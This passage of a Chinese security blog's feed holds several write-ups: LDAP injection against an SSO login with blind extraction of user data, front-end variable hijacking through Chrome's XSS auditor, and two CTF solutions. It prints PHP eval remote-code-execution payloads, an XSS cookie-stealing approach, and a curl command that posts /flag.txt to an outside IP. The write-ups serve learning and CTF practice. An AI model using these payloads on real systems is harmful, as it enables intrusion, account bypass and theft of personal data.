title="逻辑与&amp;"></a>逻辑与&amp;</h3><pre><code>(&amp;(username=Hpdoger)(password=ikun))</code></pre><p>查找name属性为Hpdoger并且password属性值为ikun的所有条目</p><h3 id="逻辑或"><a href="#逻辑或" class="headerlink" title="逻辑或|"></a>逻辑或|</h3><pre><code>(|(username=Hpdoger)(displayname=Hpdoger))</code></pre><p>查找username或者displayname为Hpdoger的所有条目</p><h3 id="特殊说明"><a href="#特殊说明" class="headerlink" title="特殊说明"></a>特殊说明</h3><p>除使用逻辑操作符外，还允许使用下面的单独符号作为两个特殊常量</p><pre><code>(&amp;)     -&gt;Absolute TRUE (|)     -&gt;Absolute FALSE *       -&gt;通配符</code></pre><p>另外，默认情况下，LDAP的DN和所有属性都不区分大小写，即在查询时：</p><pre><code>(username=Hpdoger) &lt;=&gt; (username=HPDOGER)</code></pre><h1 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h1><p>由于LDAP的出现可以追溯到1980年，关于它的漏洞也是历史悠久。LDAP注入攻击和SQL注入攻击相似，利用用户引入的参数生成LDAP查询。攻击者构造恶意的查询语句读取其它数据/跨objectclass读取属性，早在wooyun时代就有师傅详细的剖析了这类漏洞。</p><p>上文说到LDAP过滤器的结构和使用得最广泛的LDAP：ADAM和OpenLDAP。然而对于下面两种情况</p><h2 id="无逻辑操作符的注入"><a href="#无逻辑操作符的注入" class="headerlink" title="无逻辑操作符的注入"></a>无逻辑操作符的注入</h2><p>情景：<code>(attribute=$input)</code></p><p>我们构造输入:<code>$input=value)(injected_filter</code></p><p>代入查询的完整语句就为:</p><pre><code>(attribute=value)(injected_filter)</code></pre><p>由于一个括号内代表一个过滤器，在OpenLDAP实施中，第二个过滤器会被忽略，只有第一个会被执行。而在ADAM中，有两个过滤器的查询是不被允许的。</p><p>因而这类情况仅对于OpenLDAP有一定的影响。</p><p>例如我们要想查询一个字段是否存在某值时，可以用<code>$input=x*</code>进行推移，利用页面响应不同判断x*是否查询成功</p><h2 id="带有逻辑操作符的注入"><a href="#带有逻辑操作符的注入" class="headerlink" title="带有逻辑操作符的注入"></a>带有逻辑操作符的注入</h2><pre><code>(|(attribute=$input)(second_filter))(&amp;(attribute=$input)(second_filter))</code></pre><p>此时带有逻辑操作符的括号相当于一个过滤器。此时形如value)(injected_filter)的注入会变成如下过滤器结构</p><pre><code>(&amp;(attribute=value)(injected_filter))(second_filter)</code></pre><p>虽然过滤器语法上并不正确，OpenLDAP还是会从左到右进行处理，忽略第一个过滤器闭合后的任何字符。一些LDAP客户端Web组成会忽略第二个过滤器，将ADAM和OpenLDAP发送给第一个完成的过滤器，因而存在注入。</p><p>举个最简单的登陆注入的例子，如果验证登陆的查询语句是这样:</p><pre><code>(&amp;(USER=$username)(PASSWORD=$pwd)) </code></pre><p>输入$username = <code>admin)(&amp;)(</code>使查询语句变为</p><pre><code>(&amp;(USER=admin)(&amp;))((PASSWORD=$pwd)) </code></pre><p>即可让后面的password过滤器失效，执行第一个过滤器而返回true，达到万能密码的效果。</p><h2 id="后注入分析"><a href="#后注入分析" class="headerlink" title="后注入分析"></a>后注入分析</h2><p>注入大致分为and、or类型这里就不赘述，感兴趣的可以看之前wooyun的文章：<br><a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html" target="_blank" rel="noopener">LDAP注入与防御剖析</a></p><p>还有一个joomla的一个userPassword注入实例:<br><a href="https://www.anquanke.com/post/id/86899" target="_blank" rel="noopener">Joomla! LDAP注入导致登录认证绕过漏洞</a></p><h1 id="回到实例"><a href="#回到实例" class="headerlink" title="回到实例"></a>回到实例</h1><p>大致了解注入类型，就开始了第一轮尝试</p><p>当通配符匹配到用户名时返回<br><img src="http://static.zybuluo.com/1160307775/sb923u1v1iw39j37wjh5utwl/image_1dfj9gu7f1d261ad2o9jao3q082q.png" alt="image_1dfj9gu7f1d261ad2o9jao3q082q.png-40.1kB"></p><p>用户名不存在时返回<br><img src="http://static.zybuluo.com/1160307775/tb9hqt9y1iahp5cmj1pvqcz7/image_1dfj9iml33968bod9etnogsu3n.png" alt="image_1dfj9iml33968bod9etnogsu3n.png-49.7kB"></p><p>构造用户名恒真<code>username=admin)(%26&amp;password=123</code></p><p><img src="http://static.zybuluo.com/1160307775/qrfa9986hua32wu2q2x2ix9c/image_1dfj9mj071drl59b37j21teu544.png" alt="image_1dfj9mj071drl59b37j21teu544.png-49.7kB"></p><p>说明它判断用户的形式并不是<code>(&amp;(USER=$username)(PASSWORD=$pwd))</code>，因为我们查到的用户名是true，但是验证密码false</p><p>由于自己也没搞过LDAP的开发..就盲猜后端应该就是这种情况:<br>执行了<code>(&amp;(USER=$username)(objectclass=xxx))</code>后，取password与$password进行对比</p><h2 id="ACTION"><a href="#ACTION" class="headerlink" title="ACTION"></a>ACTION</h2><p>那么首先要知道它继承了哪些objectclass？因为树结构都有根，使我们能顺藤摸瓜。首先是top肯定存在，回显如下:<br><img src="http://static.zybuluo.com/1160307775/7ecp180xp7enguup7a2n5tqy/image_1dfje9v39cu01n95u4fqln1ed9.png" alt="image_1dfje9v39cu01n95u4fqln1ed9.png-36.9kB"></p><p>但是top的子类太多了，先fuzz一下objectclass的值缩小范围，payload：</p><pre><code>username=admin)(objectclass%3d$str</code></pre><p>发现存在<strong>person</strong>和<strong>user</strong>两个objectclass</p><p>再fuzz一下attribute得到的值如下:</p><pre><code>username=admin)($str%3d*</code></pre><p><img src="http://static.zybuluo.com/1160307775/0rekimpjhm9tollhhcaubz6d/image_1dfjehfm71qa71ri11b481mj9183m.png" alt="image_1dfjehfm71qa71ri11b481mj9183m.png-80.2kB"></p><p>凭借这些信息去LDAP文档里溯继承链，先去找user类，继承自organizationalPerson<br><img src="http://static.zybuluo.com/1160307775/kynru1hdqr9ddv1fmjekhfm3/image_1dfjeub3c1dfvnb5dv6k61i7l13.png" alt="image_1dfjeub3c1dfvnb5dv6k61i7l13.png-67.3kB"></p><p>同理organizationalperson又是继承自person的，person继承自top，最终的继承链为：</p><pre><code>top-&gt;person-&gt;organizationalperson-&gt;user</code></pre><p>也就是说这些类存在的属性都可能被调用。很遗憾的是我并没有fuzz到password类型参数，一般来说password会以userPassword的形式存储在person对象中，很多基于ldap的开发demo中也是这样写的。</p><p>但是userPassword毕竟也只是person类可选的属性，开发大概率是改名或者重写属性了，这也是这个漏洞没有上升到严重危害的瓶颈点<br><img src="http://static.zybuluo.com/1160307775/p4h9mmkslh8tlbd5r0rkxtbm/image_1dfki06dp1sqm147onc11odt3at13.png" alt="image_1dfki06dp1sqm147onc11odt3at13.png-127.9kB"></p><p>不过依然可以注出一些有用的数据。例如所有用户的用户名、邮箱、手机号、姓名、性别等等，说不定以后可以越权修改某账号性别呢-3-</p><h3 id="盲注mobile"><a href="#盲注mobile" class="headerlink" title="盲注mobile"></a>盲注mobile</h3><p>尝试注入管理员的手机号mobile</p><pre><code>username=admin)(mobile=%s*&amp;password=123</code></pre><p><img src="http://static.zybuluo.com/1160307775/6lqgjwtvxcx4wr7ikao76lpp/image_1dfkgoopj19s4kkkq0sulvmp4m.png" alt="image_1dfkgoopj19s4kkkq0sulvmp4m.png-52.6kB"></p><p>利用通配符不断添加数字，同理邮箱也可以注出来，与sql盲注的思路相同。<br><img src="http://static.zybuluo.com/1160307775/b7vu7ejawvpqhishg5ur9vw7/image_1dfl7ap4k1pna18bk17ec24166o2n.png" alt="image_1dfl7ap4k1pna18bk17ec24166o2n.png-42.3kB"></p><h3 id="盲注username"><a href="#盲注username" class="headerlink" title="盲注username"></a>盲注username</h3><p>毕竟对于sso，收集username是很有用的信息。那么问题来了，我们是可以通过生成字典来遍历存在的用户名，但是这个工作量是指数倍的增长，一天能跑完一个字母开头的就不错了，而且浪费了通配符的作用。</p><p>可是又想做到无限迭代把所有用户一个不漏的跑完，passer6y师傅提醒我用笛卡尔积</p><p>最后画出来的流程图大致如下：<br><img src="http://static.zybuluo.com/1160307775/0gqjmouv6mhti38uiktqg2xo/image_1dfkks6d86j6ra51m7821d3831g.png" alt="image_1dfkks6d86j6ra51m7821d3831g.png-87.6kB"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>网上关于这类漏洞的fuzz思路也比较久远了，第一次接触这种漏洞，若文章思路如果有什么不对的地方还请师傅们斧正。自己对这类漏洞的姿势理解很浅，现在漏洞已经修复，但是如果有师傅对于password的注入有想法，可以私下交流一下</p><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p><a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html</a><br><a href="https://www.cnblogs.com/pycode/p/9495808.html" target="_blank" rel="noopener">https://www.cnblogs.com/pycode/p/9495808.html</a><br><a href="https://zhuanlan.zhihu.com/p/32732045" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/32732045</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在最近的一次测试中，随缘摸到了一个sso系统，留给前台的功能只有登陆。&lt;/p&gt;
&lt;p&gt;没有验证码，但是登陆点强制要求每个用户更改强密码，而且除了管理员和测试账号其他大部分都是工号形式，直接fuzz一把梭&lt;/p&gt;
&lt;p&gt;测试过程中发现username对于下面payload会存
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>前端全局变量劫持</title>
    <link href="https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/"/>
    <id>https://hpdoger.cn/2019/07/02/前端全局变量劫持/</id>
    <published>2019-07-01T16:00:00.000Z</published>
    <updated>2019-07-14T12:58:52.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端全局变量劫持"><a href="#前端全局变量劫持" class="headerlink" title="前端全局变量劫持"></a>前端全局变量劫持</h1><p>最近看了wonderkun师傅的一篇文章，觉得还挺有意思的，收获颇丰。决定自己复现研究一下，原文地址：<a href="http://blog.wonderkun.cc/2019/07/01/前端中存在的变量劫持漏洞" target="_blank" rel="noopener">前端中存在的变量劫持漏洞</a></p><p>先说一下鸡肋的点，这个变量的劫持也只能是把变量劫持为正常页面的window对象，并不能随意修改变量的值</p><h1 id="子页面获取"><a href="#子页面获取" class="headerlink" title="子页面获取"></a>子页面获取</h1><p>首先kun师傅介绍了三种父页面获取子页面windows对象的方式:</p><pre><code>document.getElementById(&quot;iframe1&quot;).contentWindow;window.frames[0]; window[0] ;</code></pre><p>id值是一个全局变量，下例中test这个”id值”就代表iframe标签。也可以通过直接调用iframe内的name属性值获取该iframe的window对象<br><img src="http://static.zybuluo.com/1160307775/8n1kln6kltgkylriy0rutpd9/image_1df3psct91n0slcp85prp177u9.png" alt="image_1df3psct91n0slcp85prp177u9.png-60.3kB"></p><h1 id="利用filter模式删除变量"><a href="#利用filter模式删除变量" class="headerlink" title="利用filter模式删除变量"></a>利用filter模式删除变量</h1><p>无论是javascript还是调用标签，都无法覆盖已经定义的变量，但是却可以定义新的变量。</p><p>怎么让页面中出现未定义的全局变量呢？kun师傅提到chrome74之后，默认的xss auditor 从block模式编程了filter模式，可以利用这个删除掉页面中的代码。也就是说我们用一段xss代码触发chrome xss auditor删除xss引用的变量，从而达到替我们删除正常变量的目的。</p><p>这里简单介绍一下xss auditor</p><h2 id="XSS-Auditor"><a href="#XSS-Auditor" class="headerlink" title="XSS-Auditor"></a>XSS-Auditor</h2><p>XSS-Auditor是chrome默认开启的，也可以选择在header中关闭Auditor</p><pre><code>X-XSS-Protection: 0</code></pre><p>它的检测机制如文档中的描述<br><img src="http://static.zybuluo.com/1160307775/78neclm89yli79mwd4htps6z/image_1df3ue0v61s3a1dcr1spb1dmt12ia1g.png" alt="image_1df3ue0v61s3a1dcr1spb1dmt12ia1g.png-126.6kB"></p><p>XSS Auditor采用黑名单方法来识别请求参数中提供的危险字符和标签。它还将查询参数与内容进行匹配以识别注入点。如果查询参数无法与响应中的内容匹配，则不会触发Auditor。</p><p>不过文档也有提到，基于上下文的检测的局限性使Auditor无法预防一些针对应用层的payload，这里不做深究。</p><h2 id="删除变量demo"><a href="#删除变量demo" class="headerlink" title="删除变量demo"></a>删除变量demo</h2><pre><code>&lt;script&gt;var hpdoger = &quot;remove me&quot;;&lt;/script&gt;</code></pre><p>当访问的参数以危险标签的形式出现在response中时，就会触发xss-auditor，成功删除自定义的hpdoger变量。下图可以看到变量被成功删除</p><pre><code>http://localhost/iframe.html?xss=%3Cscript%3E%0A%20%20%20%20%20var%20hpdoger%20=%20%22remove%22;%0A%3C/script%3E</code></pre><p><img src="http://static.zybuluo.com/1160307775/c70k199x2qygcxi7z7nmf9fg/image_1df3uoatdojsl0fksa1e3b1nb21t.png" alt="image_1df3uoatdojsl0fksa1e3b1nb21t.png-112.7kB"></p><h1 id="bypass同源之iframe"><a href="#bypass同源之iframe" class="headerlink" title="bypass同源之iframe"></a>bypass同源之iframe</h1><p>众所周知，用iframe去加载子页面会被同源限制(除非是cors配置的白名单)<br><img src="http://static.zybuluo.com/1160307775/98cjog73vc1fxs6fuei5nypt/image_1df3vq1ivipk1qo3a383ao1lnd2n.png" alt="image_1df3vq1ivipk1qo3a383ao1lnd2n.png-93.8kB"></p><p><strong>如果儿子页面也存在iframe</strong>(划重点)，先通过操纵孙子c页面window对象来设置location，使其指向父页面a，这样父页面a和子页面b就同源了。之后再修改孙子页面c中window对象的name，其作用结果是：name作用域在子页面b的全局变量。</p><h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>这里不重复造轮子了，引用kun师傅的文章：<a href="https://xz.aliyun.com/t/5565#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/5565#toc-4</a></p><h2 id="孙子页面c"><a href="#孙子页面c" class="headerlink" title="孙子页面c"></a>孙子页面c</h2><p>任意的页面</p><h2 id="子页面b"><a href="#子页面b" class="headerlink" title="子页面b"></a>子页面b</h2><p><img src="http://static.zybuluo.com/1160307775/mz1lfmzmxftl49tvbpeh5lxn/image_1df5h2g811eg76b3bdo1v0b18dqm.png" alt="image_1df5h2g811eg76b3bdo1v0b18dqm.png-53.8kB"></p><h2 id="父页面a"><a href="#父页面a" class="headerlink" title="父页面a"></a>父页面a</h2><p>第一步很关键的一点就是修改c页面的location指向a。之后a页面就可以调用b的变量，同时通过iframe触发b页面的xss auditor<br><img src="http://static.zybuluo.com/1160307775/86zy0vdrthffjgmulc9qqu9c/image_1df5grfcl16f71ejc1j5upqr10re9.png" alt="image_1df5grfcl16f71ejc1j5upqr10re9.png-127.5kB"></p><p>第二步修改孙子页面c的name，从而帮b页面注册一个全局变量名为”hpdoger”<br><img src="http://static.zybuluo.com/1160307775/4qeb5di2v560f26o9jdr9804/image_1df5h8abti9j1bptl671to1e3213.png" alt="image_1df5h8abti9j1bptl671to1e3213.png-72.1kB"></p><p>这样就成功替换掉b页面的hpdoger变量，同时a页面也可以访问b页面这个全局变量hpdoger(但是不能访问b的其他变量。因为我们通过c页面做跳板，只能访问c的属性间接访问到b的变量，我叫他”同名法则”)。不过前文也提到了这个鸡肋的地方，就是一个变量替换成window对象，受用面很有限。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前端全局变量劫持&quot;&gt;&lt;a href=&quot;#前端全局变量劫持&quot; class=&quot;headerlink&quot; title=&quot;前端全局变量劫持&quot;&gt;&lt;/a&gt;前端全局变量劫持&lt;/h1&gt;&lt;p&gt;最近看了wonderkun师傅的一篇文章，觉得还挺有意思的，收获颇丰。决定自己复现研究一下，
      
    
    </summary>
    
    
      <category term="XSS测试" scheme="https://hpdoger.cn/tags/XSS%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>2019国赛Web线上题目Lovemath多解WP</title>
    <link href="https://hpdoger.cn/2019/04/23/2019%E5%9B%BD%E8%B5%9BWeb%E7%BA%BF%E4%B8%8A%E9%A2%98%E7%9B%AELovemath%E5%A4%9A%E8%A7%A3WP/"/>
    <id>https://hpdoger.cn/2019/04/23/2019国赛Web线上题目Lovemath多解WP/</id>
    <published>2019-04-22T16:00:00.000Z</published>
    <updated>2019-07-12T10:03:27.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019国赛Web线上题目Lovemath多解WP"><a href="#2019国赛Web线上题目Lovemath多解WP" class="headerlink" title="2019国赛Web线上题目Lovemath多解WP"></a>2019国赛Web线上题目Lovemath多解WP</h1><p>题目质量很不错，这题整整做了七个小时，从一开始想着拿一血到后来的自闭。</p><h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><pre><code class="php">&lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&#39;c&#39;])){     show_source(__FILE__); }else{     //例子 c=20-1     $content = $_GET[&#39;c&#39;];     if (strlen($content) &gt;= 80) {         die(&quot;太长了不会算&quot;);     }     $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];     foreach ($blacklist as $blackitem) {         if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {             die(&quot;请不要输入奇奇怪怪的字符&quot;);         }     }     //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp     $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);     foreach ($used_funcs[0] as $func) {         if (!in_array($func, $whitelist)) {             die(&quot;请不要输入奇奇怪怪的函数&quot;);         }     }     //帮你算出答案     eval(&#39;echo &#39;.$content.&#39;;&#39;); }</code></pre><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>代码有一个黑名单blacklist&amp;白名单whitelist。黑名单肯定是绕不过去，虽然正则给了/m模式的情况下可以采用换行绕过，但是\r也在封杀范围所以直接pass。注意看whitelist后面的逻辑：正则匹配所有字母，用foreach逐个比对匹配的字母。<br><img src="http://static.zybuluo.com/1160307775/rd7dioxl1v60noellw9opm0m/image_1d94aluchp6k1a607ht1ml2132q9.png" alt="image_1d94aluchp6k1a607ht1ml2132q9.png-224.4kB"></p><p>也就是说只允许Eval使用白名单的函数做字符串</p><p>所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下<br><img src="http://static.zybuluo.com/1160307775/73g78cw6hxwdepx0wny3oloy/image_1d9419hr91e511p621k4l177k1a5726.png" alt="image_1d9419hr91e511p621k4l177k1a5726.png-31.6kB"></p><p>想办法把数字变成字母，再通过eval进行RCE。着眼于函数base_convert，官方描述如下<br><img src="http://static.zybuluo.com/1160307775/u1tsyajx6w5bpj9o8bksaa6e/image_1d94aoodi184tdml1udl7q91b0gm.png" alt="image_1d94aoodi184tdml1udl7q91b0gm.png-126.9kB"></p><p>它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字到字母的转化，成功打印phpinfo如下<br><img src="http://static.zybuluo.com/1160307775/6otny6nfb85kfltkdhoutv2b/image_1d94ard4e1orte5mo6a1oj6hjj1j.png" alt="image_1d94ard4e1orte5mo6a1oj6hjj1j.png-396.7kB"></p><h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><p>因为字符串长度限制，我最开始的想法是这样的：</p><pre><code>$input = hexdec(bin2hex(&quot;system(&#39;cat /flag&#39;);&quot;))$result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</code></pre><p>完整转换是这样：</p><pre><code>base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</code></pre><p>但是由于bin2hex后转换出来的16进制数值过大，导致hexdec转换的int值很大无法正常被dechex还原而溢出。在赛后看到一种payload，很聪明的避免了大数溢出的情况，如下</p><pre><code>base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194)))</code></pre><p><img src="http://static.zybuluo.com/1160307775/xtgdey8iv615ywg0w55fxfay/image_1d941nbdm171k17a3lhg16ii1knh3q.png" alt="image_1d941nbdm171k17a3lhg16ii1knh3q.png-24.3kB"></p><p>正好79个字母堪称完美…解码后的调用栈如下<br><img src="http://static.zybuluo.com/1160307775/u3la0kpp7bgngowxzez2nx21/image_1d941l8bp14ag1cq1eil1hi57ti3d.png" alt="47138-&gt;exec"></p><h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><p>这个是看到ROIS队伍师傅的poc</p><pre><code>$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})</code></pre><p>解码出来是<code>system(getallheaders(){9})</code></p><p>也是很聪明的解法。变量赋值pi减少长度，用getallheaders动态传入参数，之前在code puzzle中见过这样的用法</p><h1 id="POC-3"><a href="#POC-3" class="headerlink" title="POC-3"></a>POC-3</h1><p>这种就是比赛时我的解法。一种小数还原的思路。我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。Payload如下，注意用白名单的值作为变量参数，否则还是会被waf</p><pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$p){1})</code></pre><p>转换的调用栈如下：<br><img src="http://static.zybuluo.com/1160307775/pwdw95ivta0rswwvhukw4mk0/image_1d94271vhpqtbtv1mk1v7upa047.png" alt="image_1d94271vhpqtbtv1mk1v7upa047.png-32.8kB"></p><p>直接发包给到C参数，成功getflag。<br><img src="http://static.zybuluo.com/1160307775/kbdgi0lo22k9ho6p51u4c325/image_1d9427hgv862p0f8bluecra94k.png" alt="image_1d9427hgv862p0f8bluecra94k.png-83.5kB"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019国赛Web线上题目Lovemath多解WP&quot;&gt;&lt;a href=&quot;#2019国赛Web线上题目Lovemath多解WP&quot; class=&quot;headerlink&quot; title=&quot;2019国赛Web线上题目Lovemath多解WP&quot;&gt;&lt;/a&gt;2019国赛Web线上
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑2019-Writeup</title>
    <link href="https://hpdoger.cn/2019/04/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019-Writeup/"/>
    <id>https://hpdoger.cn/2019/04/08/西湖论剑2019-Writeup/</id>
    <published>2019-04-07T16:00:00.000Z</published>
    <updated>2019-04-09T08:33:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="西湖论剑2019-Writeup"><a href="#西湖论剑2019-Writeup" class="headerlink" title="西湖论剑2019-Writeup"></a>西湖论剑2019-Writeup</h1><p>Author:Hpdoger@D0g3</p><p>这次比赛的Web题顺序放的很有意思。先放web3、再web2、接着web1来了个bug题被秒。ak了三个web之后本来都出去买奶茶喝了，结果比赛末尾有师傅说上了个web4…好在最后零解23333</p><h1 id="Web-3"><a href="#Web-3" class="headerlink" title="Web-3"></a>Web-3</h1><p>扫描到DS_Store文件泄露：<a href="http://ctf3.linkedbyx.com/11182/DS_Store" target="_blank" rel="noopener">http://ctf3.linkedbyx.com/11182/DS_Store</a><br><img src="http://static.zybuluo.com/1160307775/y7a0rdxx52eav7p0rn96oikc/image_1d7rcmc741ep8qtr17um15g5v49.png" alt="image_1d7rcmc741ep8qtr17um15g5v49.png-31.9kB"></p><p>扫描了一下e1xxx这个自路径发现一处git泄露：<br><img src="http://static.zybuluo.com/1160307775/4utptwr6qxtydxzsxhry0pvr/image_1d7rcont5k191lp1131q17k81eri4m.png" alt="image_1d7rcont5k191lp1131q17k81eri4m.png-38.3kB"></p><p>访问到github仓库:<a href="https://github.com/cumtxujiabin/zip" target="_blank" rel="noopener">https://github.com/cumtxujiabin/zip</a><br><img src="http://static.zybuluo.com/1160307775/ucxu7j63r39crwi3tci5vl0x/image_1d7rcp5i018i0sesg9a1oec9g353.png" alt="image_1d7rcp5i018i0sesg9a1oec9g353.png-78.6kB"></p><p>源码git clone下来看，发现Backup这个zip包需要密码，但是同文件夹下有Index.php和jpg被解压出来了。猜测是已知明文攻击<br><img src="http://static.zybuluo.com/1160307775/vhc6g73jwf6obx3j6edutvqy/image_1d7rcsqca1qcl1538t7j1mpti6f60.png" alt="image_1d7rcsqca1qcl1538t7j1mpti6f60.png-37.5kB"></p><p>用AR跑了一下得到hint文件<br><img src="http://static.zybuluo.com/1160307775/kw4offpg4avzpe0ccs5ji599/image_1d7s0v7dd1djv10opn7j11jq113cei.png" alt="image_1d7s0v7dd1djv10opn7j11jq113cei.png-72.4kB"></p><p>点开hint有两个提示，</p><ol><li>很明显这个code就是之前首页的参数值<br><img src="http://static.zybuluo.com/1160307775/qr951e5gxpg4860aulbxpnvj/image_1d7riioviv8dnt21j3g1m6s1l9j6q.png" alt="image_1d7riioviv8dnt21j3g1m6s1l9j6q.png-14.9kB"></li><li>seed应该暗示着随机数/种子</li></ol><p>拿着Code请求得到一个数，结合hint猜测是要用兑换码爆破随机数种子<br><img src="http://static.zybuluo.com/1160307775/lfy0x9hxu4icygym0gkvnrx5/image_1d7rilc951g6t1idm1qtg1osbjnv77.png" alt="image_1d7rilc951g6t1idm1qtg1osbjnv77.png-61.2kB"></p><p>最后跑出来种子+.txt后缀请求得到flag<br><img src="http://static.zybuluo.com/1160307775/a6w2254ge2kgzj3ltc4t7gau/image_1d7rkjigs14vl1gg9h801mr18onag.png" alt="image_1d7rkjigs14vl1gg9h801mr18onag.png-40kB"><br><img src="http://static.zybuluo.com/1160307775/sj0b5o6mrowzi3y4jl0ce6cn/image_1d7rkfg2e1enjh0g1kif2lb14ala3.png" alt="image_1d7rkfg2e1enjh0g1kif2lb14ala3.png-23.2kB"></p><p>略脑洞。。</p><h1 id="Web-2"><a href="#Web-2" class="headerlink" title="Web-2"></a>Web-2</h1><p>题目环境关了有些无法截图</p><p>随便输入账号都能登陆，有留言功能、提交给管理员url的功能和EXEC页面，EXEC我推测是个命令执行但是需要管理员权限，所以应该是XSS-&gt;admin-&gt;rce。留言位置可以插入标签iframe\img\svg.. 但是过滤掉了等号，会被转译成:)，我测试的时候用iframe以base64编码属性就能绕过</p><pre><code>&lt;iframe/src=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==</code></pre><p>编码内容即<code>&lt;img src=x onerror=alert(1)&gt;</code>，可以弹出对话框，</p><p>看到了提交Url处有这么一句话，大致好像是这么说的：管理员会拿着你的token来请求页面，之前还在想管理员怎么请求到我的main(因为我测试可以缓存js文件，可能也是一个方面)，但是看到这里就完全不用担心了，直接X一个储值型的标签打COOKIE</p><p>但是测试用js uri加载外源js不能成功，打不到cookie。</p><p>那么我们可不可以直接src下调用Javascript伪协议执行一段js发送COOKIE到平台呢？用ascii编码html字符去bypass</p><p>编码转换+exp如下<br><img src="http://static.zybuluo.com/1160307775/b5tqrpd78fjkvlld0e7sxvy9/image_1d7rltv912q91kmukju81714bjbn.png" alt="image_1d7rllved1r0b1ku31lp717bi3hdat.png-71.2kB"></p><p>url编码处理一下&amp;、#字符<br><img src="http://static.zybuluo.com/1160307775/amfts3uhddl0jr31udpj9qpa/image_1d7rloelagnr1aib1g56184q16cpba.png" alt="image_1d7rloelagnr1aib1g56184q16cpba.png-153kB"></p><p>在平台打到cookie，发现存在admin字段<br><img src="http://static.zybuluo.com/1160307775/e3jfk48x3gtv1b2sv72x2rkh/image_1d7rlvepfab61co61oj45l6nctc4.png" alt="image_1d7rlvepfab61co61oj45l6nctc4.png-36.5kB"></p><p>带着admin字段去exec.php执行命令就行了<br><img src="http://static.zybuluo.com/1160307775/ucowwhqx8njayw5q0mdhm8rm/image_1d7rm2jhs1ijc1t2898epplgch.png" alt="image_1d7rm2jhs1ijc1t2898epplgch.png-70.5kB"></p><pre><code>curl+&#39;http://50.16.48.95/&#39;+--data+&quot;`cat+/flag.txt`&quot;</code></pre><p><img 